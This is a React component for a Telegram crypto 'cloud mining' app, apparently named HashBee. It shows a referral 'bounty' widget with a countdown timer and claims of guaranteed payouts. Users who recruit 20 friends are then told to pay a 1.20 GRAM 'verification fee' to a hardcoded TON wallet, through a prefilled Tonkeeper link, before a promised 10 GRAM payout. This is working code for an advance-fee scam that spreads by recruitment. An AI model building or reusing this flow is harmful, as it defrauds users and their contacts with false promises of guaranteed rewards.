import React, { useEffect, useState, useMemo } from 'react'
import { useAuth } from '../context/AuthContext'
import { fetchViralBounty, claimViralBounty } from '../services/api'
import { ViralBountyInfo } from '../types'
import toast from 'react-hot-toast'

export const ViralBountyWidget: React.FC = () => {
  const { user } = useAuth()
  const [isOpen, setIsOpen] = useState(false)
  const [loading, setLoading] = useState(false)
  const [bounty, setBounty] = useState<ViralBountyInfo | null>(null)
  
  // Cashout Modal State
  const [showCashoutModal, setShowCashoutModal] = useState(false)
  const [walletInput, setWalletInput] = useState('')
  const [submittingCashout, setSubmittingCashout] = useState(false)
  const [activeRequest, setActiveRequest] = useState<any>(null)
  const [copiedMemo, setCopiedMemo] = useState(false)
  const [copiedAddr, setCopiedAddr] = useState(false)

  const botUsername = import.meta.env.VITE_BOT_USERNAME || 'hashbe_bot'
  const userTgId = user?.telegram_id || ''
  const inviteLink = `https://t.me/${botUsername}?start=${userTgId}`

  const loadBounty = async () => {
    try {
      setLoading(true)
      const data = await fetchViralBounty()
      if (data) {
        setBounty(data)
        if (data.existing_request) {
          setActiveRequest(data.existing_request)
        }
      }
    } catch (err) {
      console.warn('Failed to load viral bounty info', err)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    loadBounty()
    const interval = setInterval(loadBounty, 25000)
    return () => clearInterval(interval)
  }, [])

  // Live countdown timer state
  const [timeLeft, setTimeLeft] = useState<{ days: number; hours: number; minutes: number; seconds: number }>({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0,
  })

  useEffect(() => {
    if (!bounty?.deadline) return

    const tick = () => {
      const target = new Date(bounty.deadline).getTime()
      const now = Date.now()
      const diff = Math.max(0, Math.floor((target - now) / 1000))

      const days = Math.floor(diff / 86400)
      const hours = Math.floor((diff % 86400) / 3600)
      const minutes = Math.floor((diff % 3600) / 60)
      const seconds = diff % 60

      setTimeLeft({ days, hours, minutes, seconds })
    }

    tick()
    const timer = setInterval(tick, 1000)
    return () => clearInterval(timer)
  }, [bounty?.deadline])

  const handleShare = () => {
    const viralText = `🎁 Grab 10 GRAM Free Airdrop + 50 GHS Mining Power on HashBee! Start cloud mining USDT & TON now! 🚀`
    const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(inviteLink)}&text=${encodeURIComponent(viralText)}`
    
    if (typeof window !== 'undefined' && window.Telegram?.WebApp?.openTelegramLink) {
      window.Telegram.WebApp.openTelegramLink(shareUrl)
    } else {
      window.open(shareUrl, '_blank')
    }
  }

  const handleCopyLink = () => {
    navigator.clipboard.writeText(inviteLink)
    toast.success('📋 Viral invite link copied to clipboard!')
  }

  const handleSubmitCashout = async () => {
    const cleanAddr = walletInput.trim()
    if (!cleanAddr || cleanAddr.length < 20) {
      toast.error('Please enter a valid TON / GRAM wallet address')
      return
    }

    setSubmittingCashout(true)
    try {
      const res = await claimViralBounty(cleanAddr)
      if (res?.request) {
        setActiveRequest(res.request)
        toast.success('🎉 Cashout initiated! Please complete the network verification fee.')
      }
      await loadBounty()
    } catch (err: any) {
      toast.error(err?.response?.data?.error || 'Failed to submit cashout request')
    } finally {
      setSubmittingCashout(false)
    }
  }

  const handlePayFeeInTonkeeper = () => {
    if (!activeRequest) return
    const depositAddr = bounty?.deposit_wallet || 'UQDAqNQO65I06uJT4oxnfQPAQoE3qnMYYSeXtat_fF-JioNR'
    const feeNano = Math.round(activeRequest.fee_gram * 1e9)
    const memo = encodeURIComponent(activeRequest.payment_memo)
    const tonkeeperUrl = `https://app.tonkeeper.com/transfer/${depositAddr}?amount=${feeNano}&text=${memo}`
    const directUrl = `ton://transfer/${depositAddr}?amount=${feeNano}&text=${memo}`

    if (typeof window !== 'undefined' && window.Telegram?.WebApp?.openLink) {
      window.Telegram.WebApp.openLink(tonkeeperUrl)
    } else {
      window.location.href = directUrl
      setTimeout(() => {
        window.open(tonkeeperUrl, '_blank')
      }, 500)
    }
  }

  const progressPercent = useMemo(() => {
    if (!bounty) return 0
    return Math.min(100, Math.round((bounty.referrals_count / bounty.min_referrals_target) * 100))
  }, [bounty])

  return (
    <>
      {/* ── 1. FLOATING RIGHT-SIDE WIDGET BADGE ── */}
      <div
        onClick={() => {
          setIsOpen(true)
          loadBounty()
        }}
        className="fixed right-1 top-[35%] z-40 cursor-pointer group select-none animate-bounce"
        style={{ animationDuration: '3s' }}
      >
        <div className="relative p-2 rounded-2xl bg-gradient-to-b from-amber-400 via-rose-500 to-indigo-600 text-white shadow-2xl shadow-rose-500/40 border-2 border-yellow-300 flex flex-col items-center gap-1 group-active:scale-95 transition-all">
          {/* Glowing pulse ring */}
          <div className="absolute -inset-1 rounded-2xl bg-gradient-to-r from-amber-400 to-rose-500 opacity-60 blur-sm animate-pulse pointer-events-none" />

          {/* Badge Icon */}
          <div className="w-8 h-8 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center text-lg relative z-10">
            🎁
          </div>

          <div className="text-center relative z-10 leading-tight">
            <span className="block text-[10px] font-black tracking-tighter text-yellow-200 uppercase">
              10 GRAM
            </span>
            <span className="block text-[8px] font-extrabold uppercase bg-white text-rose-600 px-1 rounded-md mt-0.5 shadow-sm">
              BOUNTY
            </span>
          </div>

          {/* Quick Timer Pill */}
          <div className="relative z-10 bg-black/40 px-1.5 py-0.5 rounded-full text-[8px] font-mono font-bold text-yellow-300">
            {bounty?.is_expired ? 'Ended' : `${timeLeft.days}d ${timeLeft.hours}h`}
          </div>
        </div>
      </div>

      {/* ── 2. VIRAL BOUNTY FULL MODAL ── */}
      {isOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/80 backdrop-blur-sm animate-fadeIn">
          <div className="bg-[#0f172a] border border-amber-500/40 rounded-3xl p-5 max-w-sm w-full text-white shadow-2xl relative overflow-hidden max-h-[92vh] overflow-y-auto">
            {/* Ambient Background Glow */}
            <div className="absolute -top-12 -right-12 w-40 h-40 bg-amber-500/20 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute -bottom-12 -left-12 w-40 h-40 bg-rose-600/20 rounded-full blur-3xl pointer-events-none" />

            {/* Header */}
            <div className="flex items-center justify-between mb-3 relative z-10">
              <span className="text-[10px] font-black uppercase tracking-wider bg-gradient-to-r from-amber-500 to-rose-500 text-white px-3 py-1 rounded-full border border-yellow-300/40 shadow-sm flex items-center gap-1">
                <span>🔥</span>
                <span>LIMITED 7-DAY EVENT</span>
              </span>
              <button
                onClick={() => setIsOpen(false)}
                className="w-8 h-8 rounded-full bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center font-bold text-sm"
              >
                ✕
              </button>
            </div>

            <div className="text-center mb-4 relative z-10">
              <div className="text-2xl mb-1">🎁</div>
              <h2 className="text-lg font-black bg-gradient-to-r from-amber-300 via-yellow-200 to-rose-300 bg-clip-text text-transparent uppercase tracking-wider">
                10 GRAM Viral Bounty
              </h2>
              <p className="text-xs text-slate-300 mt-1 leading-relaxed">
                Invite <strong className="text-yellow-300">20 friends</strong> within 7 days to earn{' '}
                <strong className="text-yellow-300">10.00 GRAM</strong> (+0.50 GRAM each) and cashout directly!
              </p>
            </div>

            {/* Live 7-Day Countdown Box */}
            <div className="p-3 rounded-2xl bg-slate-900/90 border border-amber-500/30 mb-4 text-center relative z-10">
              <div className="text-[10px] font-extrabold uppercase tracking-wider text-amber-400 mb-2 flex items-center justify-center gap-1">
                <span>⏱️</span>
                <span>{bounty?.is_expired ? 'EVENT PERIOD CONCLUDED' : 'YOUR 7-DAY EVENT TIMER'}</span>
              </div>
              {bounty?.is_expired ? (
                <div className="p-2.5 rounded-xl bg-slate-800/80 border border-slate-700 text-xs text-slate-300 font-medium">
                  ⏳ Your 7-day viral bounty window has concluded for this account.
                </div>
              ) : (
                <div className="grid grid-cols-4 gap-1.5 font-mono text-center">
                  <div className="bg-slate-800/80 p-2 rounded-xl border border-slate-700">
                    <div className="text-base font-black text-white">{String(timeLeft.days).padStart(2, '0')}</div>
                    <div className="text-[8px] text-slate-400 uppercase font-sans">Days</div>
                  </div>
                  <div className="bg-slate-800/80 p-2 rounded-xl border border-slate-700">
                    <div className="text-base font-black text-white">{String(timeLeft.hours).padStart(2, '0')}</div>
                    <div className="text-[8px] text-slate-400 uppercase font-sans">Hours</div>
                  </div>
                  <div className="bg-slate-800/80 p-2 rounded-xl border border-slate-700">
                    <div className="text-base font-black text-white">{String(timeLeft.minutes).padStart(2, '0')}</div>
                    <div className="text-[8px] text-slate-400 uppercase font-sans">Mins</div>
                  </div>
                  <div className="bg-slate-800/80 p-2 rounded-xl border border-slate-700">
                    <div className="text-base font-black text-amber-400">{String(timeLeft.seconds).padStart(2, '0')}</div>
                    <div className="text-[8px] text-slate-400 uppercase font-sans">Secs</div>
                  </div>
                </div>
              )}
            </div>

            {/* Progress Card */}
            <div className="p-4 rounded-2xl bg-gradient-to-br from-slate-900 to-slate-800 border border-slate-700 mb-4 relative z-10">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-300">Bounty Progress:</span>
                <span className="text-xs font-mono font-black text-emerald-400">
                  {(bounty?.current_gram || 0).toFixed(2)} / 10.00 GRAM
                </span>
              </div>

              {/* Progress Bar */}
              <div className="w-full h-3 bg-slate-950 rounded-full overflow-hidden p-0.5 border border-slate-700 mb-2">
                <div
                  className="h-full bg-gradient-to-r from-amber-500 via-rose-500 to-emerald-400 rounded-full transition-all duration-500"
                  style={{ width: `${progressPercent}%` }}
                />
              </div>

              <div className="flex items-center justify-between text-[11px] text-slate-400">
                <span>
                  👥 <strong>{bounty?.referrals_count || 0}</strong> / 20 Friends
                </span>
                <span className="font-extrabold text-amber-400">+{bounty?.reward_per_referral || 0.5} G per invite</span>
              </div>
            </div>

            {/* ── TRUST & LIVE ON-CHAIN PAYOUT PROOFS CARD ── */}
            <div
              onClick={() => {
                const proofUrl = 'https://t.me/HashBeePayouts'
                if (typeof window !== 'undefined' && window.Telegram?.WebApp?.openTelegramLink) {
                  window.Telegram.WebApp.openTelegramLink(proofUrl)
                } else {
                  window.open(proofUrl, '_blank')
                }
              }}
              className="p-3 rounded-2xl bg-gradient-to-r from-emerald-950/60 to-slate-900 border border-emerald-500/40 mb-4 cursor-pointer hover:border-emerald-400 active:scale-[0.98] transition-all relative z-10 group"
            >
              <div className="flex items-center justify-between gap-2">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-xl bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center text-sm text-emerald-400 shrink-0">
                    🛡️
                  </div>
                  <div>
                    <div className="text-xs font-black text-white flex items-center gap-1.5">
                      <span>100% Guaranteed On-Chain Payouts</span>
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                    </div>
                    <div className="text-[10px] text-emerald-300/90 font-medium">
                      Live TON blockchain payout proofs & receipts
                    </div>
                  </div>
                </div>
                <span className="text-[10px] font-black text-emerald-400 uppercase tracking-wider bg-emerald-500/20 px-2 py-1 rounded-lg border border-emerald-500/30 shrink-0 group-hover:bg-emerald-500 group-hover:text-slate-950 transition-colors">
                  PROOF →
                </span>
              </div>
            </div>

            {/* Share Actions */}
            <div className="space-y-2 mb-4 relative z-10">
              <button
                onClick={handleShare}
                className="w-full py-3 rounded-2xl bg-gradient-to-r from-[#0088ff] to-[#00b4d8] text-white font-black text-xs uppercase tracking-wider shadow-lg shadow-blue-500/25 flex items-center justify-center gap-2 active:scale-95 transition-all"
              >
                <span>🚀</span>
                <span>INVITE FRIENDS ON TELEGRAM (+0.50 G)</span>
              </button>

              <button
                onClick={handleCopyLink}
                className="w-full py-2.5 rounded-2xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs uppercase tracking-wider border border-slate-700 flex items-center justify-center gap-1.5 active:scale-95"
              >
                <span>📋</span>
                <span>COPY MY VIRAL INVITE LINK</span>
              </button>
            </div>

            {/* Cashout / Claim Trigger Button */}
            <div className="relative z-10">
              {activeRequest ? (
                <button
                  onClick={() => setShowCashoutModal(true)}
                  className="w-full py-3 rounded-2xl bg-gradient-to-r from-amber-500 to-rose-500 text-white font-black text-xs uppercase tracking-wider shadow-lg shadow-amber-500/30 flex items-center justify-center gap-2 active:scale-95 animate-pulse"
                >
                  <span>⚡</span>
                  <span>
                    {activeRequest.fee_paid ? '✅ VIEW 10 GRAM PAYOUT STATUS' : '⚠️ COMPLETE 1.20 G FEE VERIFICATION'}
                  </span>
                </button>
              ) : (bounty?.referrals_count || 0) >= 20 ? (
                <button
                  onClick={() => setShowCashoutModal(true)}
                  className="w-full py-3 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white font-black text-xs uppercase tracking-wider shadow-lg shadow-emerald-500/30 flex items-center justify-center gap-2 active:scale-95 animate-bounce"
                >
                  <span>🎉</span>
                  <span>CLAIM & CASHOUT 10.00 GRAM NOW</span>
                </button>
              ) : (
                <button
                  disabled
                  className="w-full py-3 rounded-2xl bg-slate-800 text-slate-500 font-bold text-xs uppercase tracking-wider border border-slate-700/50 cursor-not-allowed text-center"
                >
                  🔒 Lock (Invite {20 - (bounty?.referrals_count || 0)} more to Cashout)
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ── 3. CASHOUT & 1.20 GRAM VERIFICATION MODAL ── */}
      {showCashoutModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/85 backdrop-blur-md animate-fadeIn">
          <div className="bg-[#0f172a] border border-amber-500/50 rounded-3xl p-5 max-w-sm w-full text-white shadow-2xl relative overflow-hidden text-center max-h-[92vh] overflow-y-auto">
            <div className="flex items-center justify-between mb-3">
              <span className="text-[10px] font-black uppercase tracking-wider bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2.5 py-1 rounded-full">
                💰 10 GRAM Cashout Payout
              </span>
              <button
                onClick={() => setShowCashoutModal(false)}
                className="w-8 h-8 rounded-full bg-slate-800 text-slate-400 hover:text-white flex items-center justify-center font-bold text-sm"
              >
                ✕
              </button>
            </div>

            {activeRequest ? (
              // ── Active Request Fee Payment Screen ──
              <div className="space-y-4 text-left">
                <div className="text-center">
                  <div className="text-3xl mb-1">
                    {activeRequest.fee_paid ? '🎉' : '🛡️'}
                  </div>
                  <h3 className="text-sm font-black text-white">
                    {activeRequest.fee_paid ? '10 GRAM Payout Queued!' : 'Verify Destination Wallet'}
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    {activeRequest.fee_paid
                      ? 'Your verification fee has been confirmed. Payout is processing!'
                      : 'To prevent sybil abuse & activate automatic 10.00 GRAM on-chain payout, complete the 1.20 GRAM network fee.'}
                  </p>
                </div>

                <div className="p-3.5 rounded-2xl bg-slate-900 border border-slate-800 space-y-2 text-xs">
                  <div className="flex justify-between">
                    <span className="text-slate-400">Destination Wallet:</span>
                    <span className="font-mono font-bold text-yellow-300 truncate max-w-[150px]">
                      {activeRequest.wallet_address}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-400">Bounty Payout:</span>
                    <span className="font-bold text-emerald-400">10.00 GRAM</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-400">Verification Fee:</span>
                    <span className="font-bold text-rose-400">1.20 GRAM</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-400">Status:</span>
                    <span className={`font-bold uppercase ${activeRequest.fee_paid ? 'text-emerald-400' : 'text-amber-400'}`}>
                      {activeRequest.fee_paid ? '✅ CONFIRMED / QUEUED' : '⏳ WAITING FOR 1.20 G FEE'}
                    </span>
                  </div>
                </div>

                {!activeRequest.fee_paid && (
                  <>
                    <button
                      onClick={handlePayFeeInTonkeeper}
                      className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-blue-500 to-indigo-600 text-white font-black text-xs uppercase tracking-wider shadow-lg shadow-blue-500/30 flex items-center justify-center gap-2 active:scale-95"
                    >
                      <span>💎</span>
                      <span>PAY 1.20 GRAM IN TONKEEPER</span>
                    </button>

                    <div className="p-3 rounded-2xl bg-slate-900/80 border border-slate-800 text-[11px] space-y-2">
                      <div>
                        <div className="text-slate-400 text-[10px] uppercase font-bold">Deposit Address:</div>
                        <div className="flex items-center justify-between font-mono text-[10px] text-slate-200 mt-0.5">
                          <span className="truncate max-w-[200px]">
                            {bounty?.deposit_wallet || 'UQDAqNQO65I06uJT4oxnfQPAQoE3qnMYYSeXtat_fF-JioNR'}
                          </span>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(bounty?.deposit_wallet || 'UQDAqNQO65I06uJT4oxnfQPAQoE3qnMYYSeXtat_fF-JioNR')
                              setCopiedAddr(true)
                              setTimeout(() => setCopiedAddr(false), 2000)
                              toast.success('Address copied!')
                            }}
                            className="text-blue-400 font-bold ml-2 shrink-0"
                          >
                            {copiedAddr ? '✓ Copied' : 'Copy'}
                          </button>
                        </div>
                      </div>

                      <div>
                        <div className="text-slate-400 text-[10px] uppercase font-bold">Required Memo (Comment):</div>
                        <div className="flex items-center justify-between font-mono font-black text-amber-300 text-xs mt-0.5">
                          <span>{activeRequest.payment_memo}</span>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(activeRequest.payment_memo)
                              setCopiedMemo(true)
                              setTimeout(() => setCopiedMemo(false), 2000)
                              toast.success('Memo copied!')
                            }}
                            className="text-amber-400 font-bold ml-2 shrink-0"
                          >
                            {copiedMemo ? '✓ Copied' : 'Copy'}
                          </button>
                        </div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            ) : (
              // ── Enter Wallet Address Screen ──
              <div className="space-y-4 text-left">
                <div className="text-center">
                  <h3 className="text-sm font-black text-white">Enter Your TON / GRAM Wallet</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Provide your destination wallet address to receive your 10.00 GRAM cashout.
                  </p>
                </div>

                <div>
                  <label className="block text-[11px] font-bold text-slate-300 uppercase mb-1">
                    Destination Wallet Address:
                  </label>
                  <input
                    type="text"
                    value={walletInput}
                    onChange={(e) => setWalletInput(e.target.value)}
                    placeholder="UQ... or EQ..."
                    className="w-full px-3.5 py-3 rounded-2xl bg-slate-900 border border-slate-700 text-white font-mono text-xs focus:outline-none focus:border-amber-400 placeholder:text-slate-600"
                  />
                </div>

                <div className="p-3 rounded-2xl bg-amber-500/10 border border-amber-500/20 text-[11px] text-amber-200">
                  💡 A small 1.20 GRAM network activation fee is required to verify your wallet and queue the automated 10.00 GRAM payout.
                </div>

                <button
                  onClick={handleSubmitCashout}
                  disabled={submittingCashout}
                  className="w-full py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white font-black text-xs uppercase tracking-wider shadow-lg shadow-emerald-500/30 flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
                >
                  {submittingCashout ? 'Processing...' : 'Proceed to Wallet Verification →'}
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </>
  )
}

export default ViralBountyWidget
